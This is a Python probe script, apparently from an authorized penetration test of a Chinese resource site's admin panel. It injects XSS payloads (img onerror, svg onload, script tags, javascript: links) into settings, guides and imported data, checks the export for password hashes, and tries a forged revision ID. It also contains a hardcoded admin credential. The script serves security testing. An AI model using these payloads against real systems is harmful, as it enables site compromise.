#!/usr/bin/env python3
"""13 管理面深挖：设置注入、导出内容、指南 Markdown、导入、反馈处理动作。"""
import json
import re
import sys

sys.path.insert(0, "/media/sunhao/F/Project/sanjiang-resources-site/reports/security/2026-10-21-attacker/scripts")
from probe_client import session, record, csrf_from, BASE

ADMIN = ("atk-admin", "Atk2026-Adm1n!x")
RES = {}


def note(k, v):
    RES[k] = v
    print(f"[{k}] {json.dumps(v, ensure_ascii=False)[:700]}")


def forms(html):
    out = []
    for m in re.finditer(r"<form\b.*?</form>", html, re.S):
        f = m.group(0)
        act = re.search(r'action="([^"]*)"', f)
        fields = []
        for i in re.finditer(r"<(input|select|textarea)\b[^>]*>", f):
            t = i.group(0)
            n = re.search(r'name="([^"]*)"', t)
            v = re.search(r'value="([^"]*)"', t)
            ty = re.search(r'type="([^"]*)"', t)
            fields.append({"tag": i.group(1), "type": ty.group(1) if ty else None,
                           "name": n.group(1) if n else None,
                           "value": (v.group(1)[:60] if v else None)})
        out.append({"action": act.group(1) if act else None, "fields": fields})
    return out


def main():
    s = session()
    r = s.post(BASE + "/api/login/", data={"username": ADMIN[0], "password": ADMIN[1]},
               headers={"Origin": BASE}, allow_redirects=False, timeout=20)
    note("admin_login", r.status_code)
    record("admin-login-13", "POST", "/api/login/", r, {"Origin": BASE},
           {"username": ADMIN[0], "password": "<...>"})
    if r.status_code != 303:
        note("blocked", r.text[:80])
        return
    d = s.get(BASE + "/admin/", timeout=20)
    c = csrf_from(d.text) or csrf_from(s.get(BASE + "/admin/users/", timeout=20).text)
    note("csrf_ok", bool(c))

    # 1. 设置：把 HTML 写进首页场景文案
    settings_page = s.get(BASE + "/admin/settings/", timeout=20)
    note("settings_form", forms(settings_page.text)[:3])
    fields = {f["name"]: f["value"] for m in forms(settings_page.text) for f in m["fields"]
              if f["name"] and f["name"].startswith("scenario.")}
    note("scenario_fields", list(fields.keys()))
    payload = dict(fields)
    payload.update({
        "scenario.design.task": "<img src=x onerror=alert('scen')>任务",
        "scenario.design.detail": "\"><svg onload=alert('scen2')>",
        "scenario.design.glyph": "<script>alert('glyph')</script>",
        "featuredResourceId": "gimp",
    })
    data = {"csrf": c, "action": "save-settings", **payload}
    r = s.post(BASE + "/api/manage/", data=data, headers={"Origin": BASE},
               allow_redirects=False, timeout=30)
    record("save-settings-html", "POST", "/api/manage/", r, {"Origin": BASE},
           {"action": "save-settings", "scenario.design.task": payload["scenario.design.task"]})
    note("save_settings_status", (r.status_code, r.headers.get("location")))
    home = s.get(BASE + "/", timeout=20)
    seg = ""
    i = home.text.find("scenario")
    html_hits = {
        "raw_img": "<img src=x onerror=alert('scen')>" in home.text,
        "raw_svg": "<svg onload=alert('scen2')>" in home.text,
        "escaped_img": "&lt;img src=x onerror=alert(&#39;scen&#39;)&gt;" in home.text,
        "onerror_count": home.text.count("onerror=alert"),
        "script_tags": len(re.findall(r"<script", home.text)),
    }
    note("home_settings_render", html_hits)
    record("home-after-scenario-xss", "GET", "/", home)
    m = re.search(r"(scenario|场景)[\s\S]{0,600}", home.text)
    note("home_snippet", re.sub(r"\s+", " ", m.group(0))[:400] if m else None)

    # 恢复设置，避免污染
    payload2 = dict(fields)
    payload2.update({"scenario.design.task": "把想法做出来", "scenario.design.detail": "图像、视频与模型",
                     "scenario.design.glyph": "创", "featuredResourceId": "gimp"})
    s.post(BASE + "/api/manage/", data={"csrf": c, "action": "save-settings", **payload2},
           headers={"Origin": BASE}, allow_redirects=False, timeout=30)

    # 2. 导出内容：是否含口令哈希/敏感字段
    r = s.get(BASE + "/api/export/", timeout=30, allow_redirects=False)
    body = r.text
    note("export_admin", {"status": r.status_code, "ctype": r.headers.get("content-type"),
                          "cd": r.headers.get("content-disposition"), "len": len(body),
                          "has_password_word": "password" in body.lower(),
                          "has_hash_word": "hash" in body.lower() or "scrypt" in body.lower(),
                          "has_users": '"users"' in body or "atk-admin" in body,
                          "top_keys": list(json.loads(body).keys())[:12] if body.strip().startswith("{") else None})
    record("export-as-admin", "GET", "/api/export/", r)

    # 3. 指南：Markdown 与标题注入
    gnew = s.get(BASE + "/admin/guides/new/", timeout=20)
    note("guide_form", forms(gnew.text)[:2])
    gfields = {}
    for m in forms(gnew.text):
        for f in m["fields"]:
            if f["name"]:
                gfields.setdefault(f["name"], f["value"])
    note("guide_fields", list(gfields.keys()))
    guide = {"title": "<img src=x onerror=alert('gt')>指南",
             "summary": "<svg onload=alert('gs')>摘要",
             "slug": "probe-guide",
             "body": "\n\n".join(["# 测试", "[x](javascript:alert('g1'))",
                                  "<script>alert('g2')</script>",
                                  "![i](data:image/svg+xml,<svg onload=alert(1)>)",
                                  "|a|b|\n|-|-|\n|<img src=x onerror=alert('g3')>|2|"]),
             "resourceIds": "gimp",
             "published": ""}
    guide.update({k: v for k, v in gfields.items() if k not in guide and v is not None})
    gd = {"csrf": c, "action": "save-guide", **guide}
    r = s.post(BASE + "/api/manage/", data=gd, headers={"Origin": BASE},
               allow_redirects=False, timeout=30)
    record("save-guide-xss", "POST", "/api/manage/", r, {"Origin": BASE},
           {"action": "save-guide", "title": guide["title"][:40]})
    note("save_guide", (r.status_code, r.headers.get("location"),
                        re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r.text))[:150]))

    # 4. 导入：合法结构 + HTML 分类名
    imp_payload = json.dumps({
        "categories": [{"id": "probe-cat", "name": "<img src=x onerror=alert('cat')>",
                        "description": "x", "glyph": "探"}],
        "resources": [{"id": "probe-import", "title": "<b onmouseover=alert('imp')>导入</b>",
                       "summary": "导入摘要", "category": "probe-cat", "kind": "开源工具",
                       "cost": "免费", "platforms": ["Windows"], "tags": ["x"],
                       "url": "https://example.com/", "sourceUrl": "https://example.com/",
                       "license": "l", "eligibility": "e", "caveat": "c",
                       "steps": ["1", "2", "3"], "status": "unverified",
                       "checkedAt": "2026-10-21", "image": "/images/gimp.png",
                       "imageAlt": "a", "access": "open", "imageRights": "unknown",
                       "imageCredit": "c"}],
    }, ensure_ascii=False)
    r = s.post(BASE + "/api/manage/", data={"csrf": c, "action": "import-apply", "payload": imp_payload},
               headers={"Origin": BASE}, allow_redirects=False, timeout=40)
    record("import-valid", "POST", "/api/manage/", r, {"Origin": BASE},
           {"action": "import-apply", "payload": "<json>"})
    note("import_valid", (r.status_code, r.headers.get("location"),
                          re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r.text))[:200]))

    # 5. 反馈：提交后看后台动作表单
    fb = session()
    fr = fb.post(BASE + "/api/reports/", data={"resourceId": "gimp", "kind": "版权与下架",
                                               "website": "", "title": "版权下架请求",
                                               "body": "这是一个用于观察后台处理动作的测试反馈正文。"},
                 headers={"Origin": BASE}, allow_redirects=False, timeout=20)
    note("feedback_submit", (fr.status_code, fr.headers.get("retry-after")))
    record("feedback-for-admin", "POST", "/api/reports/", fr, {"Origin": BASE},
           {"title": "版权下架请求"})
    reps = s.get(BASE + "/admin/reports/", timeout=20)
    note("report_forms", [{"action": f["action"],
                           "fields": [x["name"] for x in f["fields"]]} for f in forms(reps.text)][:6])
    record("admin-reports-forms", "GET", "/admin/reports/", reps)
    # 尝试伪造修订 ID 关联
    r = s.post(BASE + "/api/manage/", data={"csrf": c, "action": "resolve-report", "id": "1",
                                            "note": "x", "revisionId": "99999"},
               headers={"Origin": BASE}, allow_redirects=False, timeout=20)
    record("resolve-report-forged-revision", "POST", "/api/manage/", r, {"Origin": BASE},
           {"action": "resolve-report", "id": 1, "revisionId": 99999})
    note("resolve_forged", (r.status_code,
                            re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r.text))[:150]))

    # 6. 审计页内容
    au = s.get(BASE + "/admin/audit/", timeout=20)
    txt = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", au.text))
    note("audit_page", {"status": au.status_code, "excerpt": txt[:400]})

    with open("/tmp/sj-attacker/evidence/13-admin-deep.json", "w") as f:
        json.dump(RES, f, ensure_ascii=False, indent=2)


if __name__ == "__main__":
    main()
